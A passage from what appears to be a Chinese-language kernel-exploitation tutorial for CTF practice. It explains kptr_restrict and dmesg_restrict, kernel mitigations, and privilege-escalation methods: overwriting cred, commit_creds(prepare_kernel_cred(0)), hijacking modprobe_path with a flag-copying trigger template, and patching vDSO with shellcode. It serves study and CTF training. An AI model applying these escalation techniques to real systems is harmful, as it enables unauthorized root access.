-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">375   │ kptr_restrict:</span><br><span class="line">376   │ </span><br><span class="line">377   │ This toggle indicates whether restrictions are placed on</span><br><span class="line">378   │ exposing kernel addresses via /proc and other interfaces.</span><br><span class="line">379   │ </span><br><span class="line">380   │ When kptr_restrict is set to (0), the default, there are no restrictions.</span><br><span class="line">381   │ </span><br><span class="line">382   │ When kptr_restrict is set to (1), kernel pointers printed using the %pK</span><br><span class="line">383   │ format specifier will be replaced with 0&#x27;s unless the user has CAP_SYSLOG</span><br><span class="line">384   │ and effective user and group ids are equal to the real ids. This is</span><br><span class="line">385   │ because %pK checks are done at read() time rather than open() time, so</span><br><span class="line">386   │ if permissions are elevated between the open() and the read() (e.g via</span><br><span class="line">387   │ a setuid binary) then %pK will not leak kernel pointers to unprivileged</span><br><span class="line">388   │ users. Note, this is a temporary solution only. The correct long-term</span><br><span class="line">389   │ solution is to do the permission checks at open() time. Consider removing</span><br><span class="line">390   │ world read permissions from files that use %pK, and using dmesg_restrict</span><br><span class="line">391   │ to protect against uses of %pK in dmesg(8) if leaking kernel pointer</span><br><span class="line">392   │ values to unprivileged users is a concern.</span><br><span class="line">393   │ </span><br><span class="line">394   │ When kptr_restrict is set to (2), kernel pointers printed using</span><br><span class="line">395   │ %pK will be replaced with 0&#x27;s regardless of privileges.</span><br><span class="line">396   │ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>kptr_restrict</code>用于控制内核的打印输出；</p>
-<table>
-<thead>
-<tr>
-<th>kptr_restrict</th>
-<th>权限描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2</td>
-<td>内核将符号地址打印为全0, root和普通用户都没有权限</td>
-</tr>
-<tr>
-<td>1</td>
-<td>root用户有权限读取, 普通用户没有权限</td>
-</tr>
-<tr>
-<td>0</td>
-<td>root和普通用户都可以读取</td>
-</tr>
-</tbody></table>
-<p>sample如下：</p>
-<ul>
-<li><p>当<code>kptr_restrict</code>为2时，有：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置kptr_restrict为2</span></span><br><span class="line">$ sudo sh -c <span class="string">&quot;echo 2 &gt; kptr_restrict&quot;</span></span><br><span class="line">$ bat /proc/sys/kernel/kptr_restrict </span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: /proc/sys/kernel/kptr_restrict</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ 2</span><br><span class="line">───────┴──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line"><span class="comment"># root和普通用户状态下地址打印为0</span></span><br><span class="line">$ cat /proc/kallsyms | grep commit_creds | bat</span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ STDIN</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ 0000000000000000 T commit_creds</span><br><span class="line">   2   │ 0000000000000000 r __ksymtab_commit_creds</span><br><span class="line">   3   │ 0000000000000000 r __kstrtab_commit_creds</span><br><span class="line">───────┴──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">$ sudo cat /proc/kallsyms | grep commit_creds | bat</span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ STDIN</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ 0000000000000000 T commit_creds</span><br><span class="line">   2   │ 0000000000000000 r __ksymtab_commit_creds</span><br><span class="line">   3   │ 0000000000000000 r __kstrtab_commit_creds</span><br><span class="line">───────┴──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li><p>当<code>kptr_restrict</code>为1时，有：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置kptr_restrict为2</span></span><br><span class="line">$ sudo sh -c <span class="string">&quot;echo 1 &gt; kptr_restrict&quot;</span></span><br><span class="line">$ sudo bat /proc/sys/kernel/kptr_restrict</span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: /proc/sys/kernel/kptr_restrict</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ 1</span><br><span class="line">───────┴──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line"><span class="comment"># 普通用户状态下地址打印为0</span></span><br><span class="line">$ cat /proc/kallsyms | grep commit_creds | bat</span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ STDIN</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ 0000000000000000 T commit_creds</span><br><span class="line">   2   │ 0000000000000000 r __ksymtab_commit_creds</span><br><span class="line">   3   │ 0000000000000000 r __kstrtab_commit_creds</span><br><span class="line">───────┴──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="comment"># root用户可以打印地址</span></span><br><span class="line">$ sudo cat /proc/kallsyms | grep commit_creds | bat</span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ STDIN</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ ffffffffb96b4730 T commit_creds</span><br><span class="line">   2   │ ffffffffba7c9b20 r __ksymtab_commit_creds</span><br><span class="line">   3   │ ffffffffba7ef382 r __kstrtab_commit_creds</span><br><span class="line">───────┴──────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure></li>
-<li><p>当<code>kptr_restrict</code>为0时，root用户和普通用户均可以打印出内核函数地址；</p>
-</li>
-</ul>
-<h3 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h3><p>dmesg命令用于显示开机信息，其中就包括加载到内核中的驱动等信息；</p>
-<p>而dmesg_restrict则是为了限制对这些信息的打印输出；</p>
-<p>sample：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.dmesg_restrict=1</span><br><span class="line">kernel.dmesg_restrict = 1</span><br><span class="line"></span><br><span class="line">$ dmesg </span><br><span class="line">dmesg: <span class="built_in">read</span> kernel buffer failed: Operation not permitted</span><br></pre></td></tr></table></figure>
-
-<h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><blockquote>
-<p>canary, dep, PIE, RELRO 等保护与用户态原理和作用相同</p>
-</blockquote>
-<ul>
-<li>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</li>
-<li>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</li>
-<li>mmap_min_addr:</li>
-</ul>
-<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>比赛相关，一般会给以下三个文件</p>
-<ol>
-<li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关；</li>
-<li>bzImage: kernel binary；</li>
-<li>rootfs.cpio: 文件系统映像；</li>
-</ol>
-<p>关于qemu的启动参数：</p>
-<p>解释一下 qemu 启动的参数：</p>
-<ul>
-<li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
-<li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
-<li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
-<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 –help 查看。</li>
-</ul>
-<p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。</p>
-<h2 id="Exploit-Aim"><a href="#Exploit-Aim" class="headerlink" title="Exploit Aim"></a>Exploit Aim</h2><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>内核提权指普通用户获取到root用户的权限，访问受限资源；</p>
-<p>有两种方式：</p>
-<ol>
-<li>改变自身进程权限；</li>
-<li>通过影响其他高权限进程来达成目的；</li>
-</ol>
-<h4 id="Change-Self"><a href="#Change-Self" class="headerlink" title="Change Self"></a>Change Self</h4><p>前面介绍了cred结构体，内核会通过进程的 <code>task_struct</code> 结构体中的 <code>cred pointer</code>来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因此，思路就比较直观了，我们可以通过以下方式来提权</p>
-<ul>
-<li>直接修改 cred 结构体的内容</li>
-<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li>
-</ul>
-<p>无论是哪一种方法，一般都分为两步：</p>
-<ol>
-<li>定位；</li>
-<li>修改；</li>
-</ol>
-<h5 id="change-cred"><a href="#change-cred" class="headerlink" title="change cred"></a>change cred</h5><h6 id="location"><a href="#location" class="headerlink" title="location"></a>location</h6><p>定位进程cred结构体的位置；</p>
-<p>根据定位方法分为：</p>
-<ol>
-<li>直接定位；</li>
-<li>间接定位；</li>
-</ol>
-<p>直接定位：<br>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。<br>在实际定位情况中，会有许多cred满足要求，主要是因为cred会被拷贝、释放。可以利用usage不为0来筛除一些cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p>
-<p>间接定位：</p>
-<ol>
-<li><p>task_struct：</p>
-<p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以：</p>
-<ol>
-<li>定位当前进程 <code>task_struct</code> 结构体的地址；</li>
-<li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址；</li>
-<li>获取 <code>cred</code> 具体的地址；</li>
-</ol>
-</li>
-<li><p>comm：</p>
-<p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p>
-<p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure></li>
-<li><p>UAF使用相同堆块</p>
-<p>虽然我们确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，我们只需要能够修改 cred 即可。</p>
-<p>如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的。这里给出一个典型的例子：</p>
-<ol>
-<li>申请一块与 cred 结构体大小一样的堆块；</li>
-<li>释放该堆块；</li>
-<li>fork 出新进程，恰好使用刚刚释放的堆块；</li>
-<li>此时，修改 cred 结构体特定内存，从而提权；</li>
-</ol>
-<p>不需要任何信息泄露；</p>
-</li>
-</ol>
-<h6 id="modify"><a href="#modify" class="headerlink" title="modify"></a>modify</h6><p>在这种方法下，我们可以直接将 cred 中的 uid-fsgid 都修改为 0。当然修改的方式有很多种，比如说</p>
-<ul>
-<li>在我们具有任意地址读写后，可以直接修改 cred。</li>
-<li>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</li>
-</ul>
-<h5 id="change-cred-pointer"><a href="#change-cred-pointer" class="headerlink" title="change cred pointer"></a>change cred pointer</h5><p>cred指针没有什么特殊的地方，很难通过直接定位方式定位到cred指针；</p>
-<h6 id="location-1"><a href="#location-1" class="headerlink" title="location"></a>location</h6><p><code>task_struct</code></p>
-<p>因此仍然利用task_struct结构体，定位其中存放的<code>cred pointer</code>；</p>
-<ol>
-<li>定位当前进程 <code>task_struct</code> 结构体的地址；</li>
-<li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址；</li>
-</ol>
-<p><code>comm</code></p>
-<p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 指针的正下方，所以我们也可以先定位 comm ，然后定位 cred 指针的地址。然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p>
-<p><code>commit_creds</code></p>
-<p>我们还可以使用<code>commit_creds(prepare_kernel_cred(0))</code>来进行提权，该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred。该方式比较适用于控制程序执行流后使用。</p>
-<h6 id="modify-1"><a href="#modify-1" class="headerlink" title="modify"></a>modify</h6><p>在具体修改时，我们可以使用如下的两种方式：</p>
-<ul>
-<li>修改 cred 指针为内核镜像中已有的 init_cred 的地址。这种方法适合于我们能够：<ol>
-<li>直接修改 cred 指针；</li>
-<li> init_cred 地址已知；</li>
-</ol>
-</li>
-<li>伪造一个 cred，然后修改 cred 指针指向该地址即可。这种方式比较麻烦，一般并不使用。</li>
-</ul>
-<h4 id="Change-Others"><a href="#Change-Others" class="headerlink" title="Change Others"></a>Change Others</h4><p>如果我们可以改变特权进程的执行轨迹，也可以实现提权。从以下角度来考虑如何改变特权进程的执行轨迹:</p>
-<ol>
-<li>改数据；</li>
-<li>改代码；</li>
-</ol>
-<h5 id="change-data"><a href="#change-data" class="headerlink" title="change data"></a>change data</h5><h6 id="symbol-link"><a href="#symbol-link" class="headerlink" title="symbol link"></a>symbol link</h6><p>如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。</p>
-<h6 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h6><p><code>call_usermodehelper</code> 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。在内核中，<code>call_usermodehelper</code> 具体要执行的应用往往是由某个变量指定的，因此我们只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式：</p>
-<p>modify <code>modprobe_path</code></p>
-<ol>
-<li>获取 modprobe_path 的地址。</li>
-<li>修改 modprobe_path 为指定的程序。</li>
-<li>触发执行<code>call_modprobe</code>，从而实现提权 。这里我们可以利用以下几种方式来触发<ol>
-<li>执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求（参考 call_usermodehelper 部分的介绍）。</li>
-<li>使用未知协议来触发。</li>
-</ol>
-</li>
-</ol>
-<p>模板如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// step 1. modify modprobe_path to the target value</span><br><span class="line"></span><br><span class="line">// step 2. create related file</span><br><span class="line">system(&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;);</span><br><span class="line">system(&quot;chmod +x /home/pwn/catflag.sh&quot;);</span><br><span class="line"></span><br><span class="line">// step 3. trigger it using unknown executable</span><br><span class="line">system(&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;);</span><br><span class="line">system(&quot;chmod +x /home/pwn/dummy&quot;);</span><br><span class="line">system(&quot;/home/pwn/dummy&quot;);</span><br><span class="line"></span><br><span class="line">// step 3. trigger it using unknown protocol</span><br><span class="line">socket(AF_INET,SOCK_STREAM,132);</span><br></pre></td></tr></table></figure>
-
-<p>如何定位<code>modprobe_path</code>呢？</p>
-<p>直接定位：由于 <code>modprobe_path</code> 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串。这需要我们具有扫描内存的能力。</p>
-<p>间接定位：考虑到 <code>modprobe_path</code> 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址。</p>
-<p>modify <code>poweroff_cmd</code></p>
-<ol>
-<li>修改<code>poweroff_cmd</code>为指定的程序。</li>
-<li>劫持控制流执行 <code>__orderly_poweroff</code>。</li>
-</ol>
-<p>定位方法类似于定位<code>modprobe_path</code>的方法；</p>
-<h5 id="change-code"><a href="#change-code" class="headerlink" title="change code"></a>change code</h5><p>在程序运行时，如果我们可以修改 root 权限进程执行的代码，也可以实现提权。</p>
-<h6 id="modify-vDSO"><a href="#modify-vDSO" class="headerlink" title="modify vDSO"></a>modify vDSO</h6><p>内核中 vDSO 的代码会被映射到所有的用户态进程中。如果有一个高特权的进程会周期性地调用 vDSO 中的函数，那我们可以考虑把 vDSO 中相应的函数修改为特定的 shellcode。当高权限的进程执行相应的代码时，我们就可以进行提权。</p>
-<p>在早期的时候，Linux 中的 vDSO 是可写的，考虑到这样的风险，Kees Cook 提出引入 <code>post-init read-only</code> 的数据，即，将那些初始化后不再被写的数据标记为只读，来防御这样的利用。</p>
-<p>在引入之前，vDSO 对应的 raw_data 只是标记了对齐属性，如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile,</span><br><span class="line">    <span class="string">&quot;static unsigned char raw_data[%lu] __page_aligned_data = &#123;&quot;</span>,</span><br><span class="line">    mapping_size);</span><br></pre></td></tr></table></figure>
-
-<p>引入之后，vDSO 对应的 raw_data 则被标记为了初始化后只读。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile,</span><br><span class="line">    <span class="string">&quot;static unsigned char raw_data[%lu] __ro_after_init __aligned(PAGE_SIZE) = &#123;&quot;</span>,        <span class="comment">// diff here</span></span><br><span class="line">    mapping_size);</span><br></pre></td></tr></table></figure>
-
-<p>通过修改 vDSO 进行提权的基本方式如下</p>
-<ul>
-<li>定位 vDSO</li>
-<li>修改 vDSO 的特定函数为指定的 shellcode</li>
-<li>等待触发执行 shellcode</li>
-</ul>
-<p>定位方式：</p>
-<ol>
-<li><p>IDA定位：在 vmlinux 中找到 vDSO 的位置；</p>
-<ol>
-<li><p>在 ida 里定位 <code>init_vdso</code>函数的地址；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 init_vdso()</span><br><span class="line">&#123;</span><br><span class="line">  init_vdso_image(&amp;vdso_image_64 + 0x20000000);</span><br><span class="line">  init_vdso_image(&amp;vdso_image_x32 + 0x20000000);</span><br><span class="line">  cpu_maps_update_begin();</span><br><span class="line">  on_each_cpu((char *)startup_64 + 0x100003EA0LL, 0LL, 1LL);</span><br><span class="line">  _register_cpu_notifier(&amp;sdata + 536882764);</span><br><span class="line">  cpu_maps_update_done();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>可以看到 <code>vdso_image_64</code> 和 <code>vdso_image_x32</code>。以<code>vdso_image_64</code> 为例，点到该变量的地址;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:FFFFFFFF81A01300                 public vdso_image_64</span><br><span class="line">.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+18↑o</span><br><span class="line">.rodata:FFFFFFFF81A01300                                         ; init_vdso+1↓o</span><br></pre></td></tr></table></figure></li>
-<li><p>点击 <code>raw_data</code> 即可知道 64 位 vDSO 在内核镜像中的地址，可以看到，vDSO 确实是以页对齐的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:FFFFFFFF81E04000 raw_data        db  7Fh ;              ; DATA XREF: .rodata:vdso_image_64↑o</span><br><span class="line">.data:FFFFFFFF81E04001                 db  45h ; E</span><br><span class="line">.data:FFFFFFFF81E04002                 db  4Ch ; L</span><br><span class="line">.data:FFFFFFFF81E04003                 db  46h ; F</span><br></pre></td></tr></table></figure>
-
-<p>从最后的符号来看，我们也可以直接使用 <code>raw_data</code> 来寻找 vDSO。</p>
-</li>
-</ol>
-</li>
-<li><p>内存定位</p>
-<ol>
-<li><p>直接定位</p>
-<p>vDSO 其实是一个 ELF 文件，具有 ELF 文件头。同时，vDSO 中特定位置存储着导出函数的字符串。因此我们可以根据这两个特征来扫描内存，定位 vDSO 的位置。</p>
-</li>
-<li><p>间接定位</p>
-<p>考虑到 vDSO 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 vDSO 的地址。</p>
-</li>
-</ol>
-</li>
-</ol>
